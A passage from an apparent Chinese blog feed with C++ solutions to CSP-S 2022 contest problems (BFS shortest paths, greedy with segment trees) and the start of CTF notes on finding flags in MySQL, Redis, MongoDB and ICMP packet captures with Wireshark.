class="math inline">\(A\)</span>、<span class="math inline">\(D\)</span>
点始终为 <span class="math inline">\(\text{att}_B\)</span> 和 <span
class="math inline">\(\text{att}_D\)</span> 的前 <span
class="math inline">\(3\)</span> 项，于是对于每组 <span
class="math inline">\(B\)</span>、<span class="math inline">\(D\)</span>
仅需枚举 <span class="math inline">\(9\)</span>
次。得出所有情况的最大值即为答案。时间复杂度为 <span
class="math inline">\(O(n^2)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s;</span><br><span class="line">    <span class="type">bool</span> v;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *s, Node *t)</span> </span>&#123;</span><br><span class="line">    s-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(s, t));</span><br><span class="line">    t-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(t, s));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line">    k++;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) nodes[i].id = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;nodes[i].s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[x], &amp;nodes[y]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">steps</span>(n + <span class="number">1</span>, std::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, INT_MAX));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> bfs = [&amp;](Node *u) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) nodes[i].v = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        std::queue&lt;std::pair&lt;<span class="type">int</span>, Node *&gt;&gt; q;</span><br><span class="line">        u-&gt;v = <span class="literal">true</span>, steps[u-&gt;id][u-&gt;id] = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(std::<span class="built_in">make_pair</span>(<span class="number">0</span>, u));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">const</span> std::pair&lt;<span class="type">int</span>, Node *&gt; p = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">int</span> step = p.first;</span><br><span class="line">            Node *v = p.second;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!e.t-&gt;v) &#123;</span><br><span class="line">                    steps[u-&gt;id][e.t-&gt;id] = step + <span class="number">1</span>;</span><br><span class="line">                    e.t-&gt;v = <span class="literal">true</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(std::<span class="built_in">make_pair</span>(step + <span class="number">1</span>, e.t));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">bfs</span>(&amp;nodes[i]);</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::vector&lt;Node *&gt;&gt; <span class="built_in">att</span>(n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (steps[i][j] &lt;= k &amp;&amp; steps[j][<span class="number">1</span>] &lt;= k) &#123;</span><br><span class="line">                att[i].<span class="built_in">push_back</span>(&amp;nodes[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) std::<span class="built_in">sort</span>(att[i].<span class="built_in">begin</span>(), att[i].<span class="built_in">end</span>(), [](Node *a, Node *b)&#123; <span class="keyword">return</span> a-&gt;s &gt; b-&gt;s; &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j || steps[i][j] &gt; k || att[i].<span class="built_in">empty</span>() || att[j].<span class="built_in">empty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">            std::vector&lt;Node *&gt;::iterator itB = att[i].<span class="built_in">begin</span>(), itC = att[j].<span class="built_in">begin</span>();</span><br><span class="line">            <span class="keyword">if</span> (*itB == &amp;nodes[j]) itB++;</span><br><span class="line">            <span class="keyword">if</span> (*itC == &amp;nodes[i]) itC++;</span><br><span class="line">            <span class="keyword">if</span> (itB == att[i].<span class="built_in">end</span>() || itC == att[j].<span class="built_in">end</span>()) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (*itB == *itC) &#123;</span><br><span class="line">                <span class="keyword">if</span> (itB + <span class="number">1</span> != att[i].<span class="built_in">end</span>() &amp;&amp; *(itB + <span class="number">1</span>) != &amp;nodes[j] &amp;&amp; *(itB + <span class="number">1</span>) != *itC) ans = std::<span class="built_in">max</span>(ans, nodes[i].s + nodes[j].s + (*(itB + <span class="number">1</span>))-&gt;s + (*itC)-&gt;s);</span><br><span class="line">                <span class="keyword">if</span> (itC + <span class="number">1</span> != att[j].<span class="built_in">end</span>() &amp;&amp; *(itC + <span class="number">1</span>) != &amp;nodes[i] &amp;&amp; *(itC + <span class="number">1</span>) != *itB) ans = std::<span class="built_in">max</span>(ans, nodes[i].s + nodes[j].s + (*itB)-&gt;s + (*(itC + <span class="number">1</span>))-&gt;s);</span><br><span class="line">            &#125; <span class="keyword">else</span> ans = std::<span class="built_in">max</span>(ans, nodes[i].s + nodes[j].s + (*itB)-&gt;s + (*itC)-&gt;s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>贪心</tag>
        <tag>CSP</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>「CSP-S 2022」策略游戏 - 贪心 + 线段树</title>
    <url>/csp2022-game/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8818">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3890">LibreOJ 链接</a></p>
<p>小 L 和小 Q 在玩一个策略游戏。</p>
<p>有一个长度为 <span class="math inline">\(n\)</span> 的数组 <span
class="math inline">\(A\)</span> 和一个长度为 <span
class="math inline">\(m\)</span> 的数组 <span
class="math inline">\(B\)</span>，在此基础上定义一个大小为 <span
class="math inline">\(n \times m\)</span> 的矩阵 <span
class="math inline">\(C\)</span>，满足 <span class="math inline">\(C_{i
j} = A_i \times B_j\)</span>。所有下标均从 <span
class="math inline">\(1\)</span> 开始。</p>
<p>游戏一共会进行 <span class="math inline">\(q\)</span>
轮，在每一轮游戏中，会事先给出 <span class="math inline">\(4\)</span>
个参数 <span class="math inline">\(l_1, r_1, l_2, r_2\)</span>，满足
<span class="math inline">\(1 \le l_1 \le r_1 \le n\)</span>、<span
class="math inline">\(1 \le l_2 \le r_2 \le m\)</span>。</p>
<p>游戏中，小 L 先选择一个 <span class="math inline">\(l_1 \sim
r_1\)</span> 之间的下标 <span class="math inline">\(x\)</span>，然后小 Q
选择一个 <span class="math inline">\(l_2 \sim r_2\)</span> 之间的下标
<span class="math inline">\(y\)</span>。定义这一轮游戏中二人的得分是
<span class="math inline">\(C_{x y}\)</span>。</p>
<p>小 L 的目标是使得这个得分尽可能大，小 Q
的目标是使得这个得分尽可能小。同时两人都是足够聪明的玩家，每次都会采用最优的策略。</p>
<p>请问：按照二人的最优策略，每轮游戏的得分分别是多少？</p>
<p>对于所有数据，<span class="math inline">\(1 \le n, m, q \le
{10}^5\)</span>，<span class="math inline">\(-{10}^9 \le A_i, B_i \le
{10}^9\)</span>。对于每轮游戏而言，<span class="math inline">\(1 \le l_1
\le r_1 \le n\)</span>，<span class="math inline">\(1 \le l_2 \le r_2
\le m\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题显然可贪心解决。</p>
<p>由于小 L 先抽，小 Q 后抽，由于小 L 先抽时必须考虑小 Q
可选的情况，于是我们可以先看小 Q 可以抽什么。假设小 L 选了 <span
class="math inline">\(x\)</span>，若 <span class="math inline">\(x &gt;
0\)</span>，则小 Q 选得尽量小；若 <span class="math inline">\(x \le
0\)</span>，则小 Q 选得尽量大即可。</p>
<p>接下来考虑小 L 的情况。设小 Q 可选的最小数为 <span
class="math inline">\(\text{minB}\)</span>，最大数为 <span
class="math inline">\(\text{maxB}\)</span>：</p>
<ul>
<li>若 <span class="math inline">\(\text{minB}\)</span>、<span
class="math inline">\(\text{maxB}\)</span> 异号：则只要不选 <span
class="math inline">\(0\)</span>，得到的数始终为负数。这种情况能选 <span
class="math inline">\(0\)</span> 就选 <span
class="math inline">\(0\)</span>；如果没有 <span
class="math inline">\(0\)</span>
就在选择正数最小值或负数最大值两种情况中取最优情况即可。</li>
<li>若 <span class="math inline">\(\text{minB}\)</span>、<span
class="math inline">\(\text{maxB}\)</span>
同号：尽量选同号且绝对值最大的数。若没有同号，则选择 <span
class="math inline">\(0\)</span>
以及异号中绝对值最小的数。证明显然。</li>
<li>若 <span class="math inline">\(\text{minB}\)</span>、<span
class="math inline">\(\text{maxB}\)</span> 中至少有一个为 <span
class="math inline">\(0\)</span>：同上。</li>
</ul>
<p>于是我们可以开线段树维护 <span class="math inline">\(A\)</span>
的最大值、最小值、正数最小值、负数最大值和 <span
class="math inline">\(0\)</span> 的个数以及维护 <span
class="math inline">\(B\)</span>
的最大值和最小值。对于每次询问查询后分类讨论即可。</p>
<p>最后注意一下 <span class="math inline">\(l1 = r1\)</span> 或 <span
class="math inline">\(l2 = r2\)</span> 时特判一下即可。时间复杂度 <span
class="math inline">\(O(n \log n)\)</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegTMin</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegTMin *lc, *rc;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegTMin</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegTMin *lc, SegTMin *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc) &#123;&#125;</span><br><span class="line">    <span class="built_in">SegTMin</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegTMin *lc, SegTMin *rc, <span class="type">long</span> <span class="type">long</span> val) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(val) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="keyword">return</span> val;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> std::<span class="built_in">min</span>(lc-&gt;<span class="built_in">query</span>(l, r), rc-&gt;<span class="built_in">query</span>(l, r));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegTMin *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r, <span class="type">long</span> <span class="type">long</span> *a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegTMin</span>(l, r, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, a[l]);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            SegTMin *segt = <span class="keyword">new</span> <span class="built_in">SegTMin</span>(l, r, <span class="built_in">build</span>(l, mid, a), <span class="built_in">build</span>(mid + <span class="number">1</span>, r, a));</span><br><span class="line">            segt-&gt;val = std::<span class="built_in">min</span>(segt-&gt;lc-&gt;val, segt-&gt;rc-&gt;val);</span><br><span class="line">            <span class="keyword">return</span> segt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segMinA, *segMinB, *segMinPA, *segMinMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegTMax</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegTMax *lc, *rc;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegTMax</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegTMax *lc, SegTMax *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc) &#123;&#125;</span><br><span class="line">    <span class="built_in">SegTMax</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegTMax *lc, SegTMax *rc, <span class="type">long</span> <span class="type">long</span> val) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(val) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="keyword">return</span> val;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> std::<span class="built_in">max</span>(lc-&gt;<span class="built_in">query</span>(l, r), rc-&gt;<span class="built_in">query</span>(l, r));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegTMax *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r, <span class="type">long</span> <span class="type">long</span> *a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegTMax</span>(l, r, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, a[l]);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            SegTMax *segt = <span class="keyword">new</span> <span class="built_in">SegTMax</span>(l, r, <span class="built_in">build</span>(l, mid, a), <span class="built_in">build</span>(mid + <span class="number">1</span>, r, a));</span><br><span class="line">            segt-&gt;val = std::<span class="built_in">max</span>(segt-&gt;lc-&gt;val, segt-&gt;rc-&gt;val);</span><br><span class="line">            <span class="keyword">return</span> segt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segMaxA, *segMaxB;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> a[MAXN + <span class="number">1</span>], b[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;b[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> zero[MAXN + <span class="number">1</span>], pa[MAXN + <span class="number">1</span>], ma[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] &gt; <span class="number">0</span>) pa[i] = a[i], ma[i] = INT_MAX;</span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt; <span class="number">0</span>) ma[i] = -a[i], pa[i] = INT_MAX;</span><br><span class="line">        zero[i] = zero[i - <span class="number">1</span>] + (a[i] == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    segMinA = SegTMin::<span class="built_in">build</span>(<span class="number">1</span>, n, a);</span><br><span class="line">    segMaxA = SegTMax::<span class="built_in">build</span>(<span class="number">1</span>, n, a);</span><br><span class="line">    segMinB = SegTMin::<span class="built_in">build</span>(<span class="number">1</span>, m, b);</span><br><span class="line">    segMaxB = SegTMax::<span class="built_in">build</span>(<span class="number">1</span>, m, b);</span><br><span class="line">    segMinPA = SegTMin::<span class="built_in">build</span>(<span class="number">1</span>, n, pa);</span><br><span class="line">    segMinMA = SegTMin::<span class="built_in">build</span>(<span class="number">1</span>, n, ma);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> l1, r1, l2, r2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;l1, &amp;r1, &amp;l2, &amp;r2);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> minA = segMinA-&gt;<span class="built_in">query</span>(l1, r1);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> maxA = segMaxA-&gt;<span class="built_in">query</span>(l1, r1);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> minB = segMinB-&gt;<span class="built_in">query</span>(l2, r2);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> maxB = segMaxB-&gt;<span class="built_in">query</span>(l2, r2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l1 == r1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[l1] &gt; <span class="number">0</span>) ans = minB * a[l1];</span><br><span class="line">            <span class="keyword">else</span> ans = maxB * a[l1];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l2 == r2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (b[l2] &gt; <span class="number">0</span>) ans = maxA * b[l2];</span><br><span class="line">            <span class="keyword">else</span> ans = minA * b[l2];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (minB * maxB &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (minB &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (maxA &lt; <span class="number">0</span>) ans = maxA * maxB;</span><br><span class="line">                    <span class="keyword">else</span> ans = maxA * minB;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (minA &lt; <span class="number">0</span>) ans = minA * maxB;</span><br><span class="line">                    <span class="keyword">else</span> ans = minA * minB;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (minB * maxB == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (minB == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (maxA &lt; <span class="number">0</span>) ans = maxA * maxB;</span><br><span class="line">                    <span class="keyword">else</span> ans = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (minA &lt; <span class="number">0</span>) ans = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> ans = minA * minB;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (minB * maxB &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (zero[r1] - zero[l1 - <span class="number">1</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ans = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> npa = segMinPA-&gt;<span class="built_in">query</span>(l1, r1);</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> nma = segMinMA-&gt;<span class="built_in">query</span>(l1, r1);</span><br><span class="line">                    ans = std::<span class="built_in">max</span>(npa * minB, -nma * maxB);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>CSP</tag>
        <tag>线段树</tag>
      </tags>
  </entry>
  <entry>
    <title>OIer 的 CTF Misc 流量分析学习笔记</title>
    <url>/ctf-flow-notes/</url>
    <content><![CDATA[<p>我们可能会得到数据库流量或协议流量等数据。我们可以利用这些数据进行分析。</p>
<p>本文一切例题均可在 <a href="https://www.ctfhub.com/">CTFHub</a>
找到。</p>
<span id="more"></span>
<h1 id="数据库类流量">数据库类流量</h1>
<p>数据库存储着很多流量信息，我们可以使用 Wireshark 进行分析。</p>
<h2 id="mysql-流量">MySQL 流量</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
数据库类流量 -&gt; MySQL 流量</p>
<p>我们可下载到 <code>mysql.pcap</code> 文件，于是我们可以选择使用
Wireshark 打开它。</p>
<h3 id="wireshark-介绍">Wireshark 介绍</h3>
<p>Wireshark 是一个网络分析工具，且 Kali Linux
自带。我们可以很方便地使用它分析流量。如打开 <code>mysql.pcap</code>
我们可得到下列信息：</p>
<img src="/ctf-flow-notes/wireshark.png" class="">
<p>接着我们可直接使用 Wireshark 搜索功能，选择 Packet bytes
并进行搜索即可得到 flag：</p>
<img src="/ctf-flow-notes/search.png" class="">
<h2 id="redis-流量">Redis 流量</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
数据库类流量 -&gt; Redis 流量</p>
<p>使用同样的方法搜索 <code>ctfhub&#123;</code> 得到 flag 的前半段：</p>
<img src="/ctf-flow-notes/redis1.png" class="">
<p>得到 <code>flag1</code> 的启发，我们猜测可能会有
<code>flag2</code>，于是我们搜索 <code>flag</code> 得到后半段 flag：</p>
<img src="/ctf-flow-notes/redis2.png" class="">
<p>组合即为答案。</p>
<h2 id="mongodb-流量">MongoDB 流量</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
数据库类流量 -&gt; MongoDB 流量</p>
<p>使用同样的方法发现 flag
所在字段。然而我们只能看到十六进制数据，于是我们使用下列方法右键复制出字符串：</p>
<img src="/ctf-flow-notes/mongodb.png" class="">
<p>复制后我们可发现下列字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> insertflagdocumentsQ0I_id^³ÂÄ¯Y#bé0flag)ctfhub&#123;XXXXXX&#125;orderedlsidid oýDp¶@9i7</span><br></pre></td></tr></table></figure>
<p>看到 <code>ctfhub</code> 字样，于是我们获得了 flag。</p>
<h1 id="协议流量分析">协议流量分析</h1>
<h2 id="icmp">ICMP</h2>
<p>我们可以同样使用 Wireshark 对 ICMP 的流量数据进行分析。</p>
<h3 id="data">Data</h3>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
协议流量分析 -&gt; ICMP -&gt; Data</p>
<p>我们使用 Wireshark 打开：</p>
<img src="/ctf-flow-notes/data.png" class="">
<p>观察文件，我们可发现规律：request / reply
的数据中每个由上图红框框出的字符都不一样。我们将这个字符提取出来连起来组成
<code>ctfhub&#123;XXXXXX&#125;</code> 字样，显然为 flag。</p>
<h3 id="length">Length</h3>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
协议流量分析 -&gt; ICMP -&gt; Length</p>
<p>我们使用 Wireshark 打开：</p>
<img src="/ctf-flow-notes/len.png" class="">
<p>观察文件，我们可发现 request / reply
的长度不一且具有规律。我们可猜测此为 ASCII 编码。由于 flag 格式为
<code>ctfhub&#123;XXXXXX&#125;</code>，于是第一位字符为 <code>c</code>，而
<code>c</code> 对应的 ASCII 编码为 <span
class="math inline">\(99\)</span>，于是我们可推出每个 request / reply
的长度为对应字符的 ASCII 编码加 <span
class="math inline">\(42\)</span>。</p>
<p>于是我们编写下列 Python 程序：</p>
